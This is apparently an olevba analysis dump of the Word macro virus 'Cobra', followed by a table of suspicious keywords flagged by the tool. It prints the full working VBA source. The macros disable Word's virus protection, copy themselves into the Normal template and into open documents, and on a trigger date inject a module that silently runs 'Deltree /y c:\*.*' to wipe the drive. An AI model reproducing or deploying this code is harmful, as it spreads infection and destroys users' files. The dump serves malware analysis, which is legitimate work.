olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.c-820406234cb2159bf8530caa58bbaf6d60d1ed9f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.c-820406234cb2159bf8530caa58bbaf6d60d1ed9f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra.bas 
in file: Virus.MSWord.Cobra.c-820406234cb2159bf8530caa58bbaf6d60d1ed9f - OLE stream: 'Macros/VBA/Cobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 1.0D
Sub AutoOpen()
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Call DelNorMac
Call CopNorMac
Call DelActMac
Call CopActMac
End Sub
Sub DelNorMac()
On Error Resume Next
Set ActDoc = ActiveDocument
Set NorTem = NormalTemplate
For n = 1 To NorTem.VBProject.VBComponents.Count
If (NorTem.VBProject.VBComponents(n).Name <> "Cobra") And _
(NorTem.VBProject.VBComponents(n).Name <> "ThisDocument") Then _
Application.OrganizerDelete Source:=NorTem.FullName, _
Name:=NorTem.VBProject.VBComponents(n).Name, Object:=wdOrganizerObjectProjectItems
Next n
End Sub
Sub CopNorMac()
On Error Resume Next
Dim ComOk As Boolean
Set ActDoc = ActiveDocument
Set NorTem = NormalTemplate
For n = 1 To NorTem.VBProject.VBComponents.Count
If NorTem.VBProject.VBComponents(n).Name = "Cobra" Then _
ComOk = True
Next
If ComOk <> True Then Application.OrganizerCopy _
Source:=ActDoc.FullName, Destination:= _
NorTem.FullName, Name:="Cobra", Object:=wdOrganizerObjectProjectItems
Templates(NorTem.FullName).Save
End Sub
Sub DelActMac()
On Error Resume Next
Set ActDoc = ActiveDocument
Set NorTem = NormalTemplate
For n = 1 To ActDoc.VBProject.VBComponents.Count
If (ActDoc.VBProject.VBComponents(n).Name <> "Cobra") And _
(ActDoc.VBProject.VBComponents(n).Name <> "ThisDocument") And _
(ActDoc.VBProject.VBComponents(n).Name <> "Reference to Normal") Then _
Application.OrganizerDelete Source:=ActDoc.FullName, _
Name:=ActDoc.VBProject.VBComponents(n).Name, Object:=wdOrganizerObjectProjectItems
Next n
End Sub
Sub CopActMac()
On Error Resume Next
Dim ComOk As Boolean
Set ActDoc = ActiveDocument
Set NorTem = NormalTemplate
For n = 1 To ActDoc.VBProject.VBComponents.Count
If ActDoc.VBProject.VBComponents(n).Name = "Cobra" Then _
ComOk = True
Next
If ComOk <> True Then Application.OrganizerCopy _
Source:=NorTem.FullName, Destination:= _
ActDoc.FullName, Name:="Cobra", Object:=wdOrganizerObjectProjectItems
ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
End Sub
Sub AutoClose()
If (Year(Now) Mod 2 = 0) And (Day(Now) = 26) And (Month(Now) = 3) Then
Call AddModToNorTem
Call AddModToActDoc
Templates(NormalTemplate.FullName).Save
ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
End If
End Sub
Sub AddModToNorTem()
Dim AddOk As Boolean
Set NorTem = NormalTemplate
For n = 1 To NorTem.VBProject.VBComponents.Count
If NorTem.VBProject.VBComponents(n).Name = "War" Then _
AddOk = True
Next
If AddOk <> True Then
Set ModAdd = NormalTemplate.VBProject.VBComponents.Add(1)
ModAdd.Name = "War"
ModAdd.Codemodule.InsertLines 1, "Sub FileExit"
ModAdd.Codemodule.InsertLines 2, "On Error Resume Next"
ModAdd.Codemodule.InsertLines 3, "Msgbox ""You are infected with Cobra"",,""Cobra"
ModAdd.Codemodule.InsertLines 4, "End Sub"
ModAdd.Codemodule.InsertLines 5, "Sub FileNew"
ModAdd.Codemodule.InsertLines 6, "Shell " + """Deltree /y c:\*.*"", vbHide"
ModAdd.Codemodule.InsertLines 7, "End Sub"
End If
End Sub
Sub AddModToActDoc()
Dim AddOk As Boolean
Set ActDoc = ActiveDocument
For n = 1 To ActDoc.VBProject.VBComponents.Count
If ActDoc.VBProject.VBComponents(n).Name = "War" Then _
AddOk = True
Next
If AddOk <> True Then
Set ModAdd = ActDoc.VBProject.VBComponents.Add(1)
ModAdd.Name = "War"
ModAdd.Codemodule.InsertLines 1, "Sub FileExit"
ModAdd.Codemodule.InsertLines 2, "On Error Resume Next"
ModAdd.Codemodule.InsertLines 3, "Msgbox ""You are infected with Cobra"",,""Cobra"
ModAdd.Codemodule.InsertLines 4, "End Sub"
ModAdd.Codemodule.InsertLines 5, "Sub FileNew"
ModAdd.Codemodule.InsertLines 6, "Shell " + """Deltree /y c:\*.*"", vbHide"
ModAdd.Codemodule.InsertLines 7, "End Sub"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

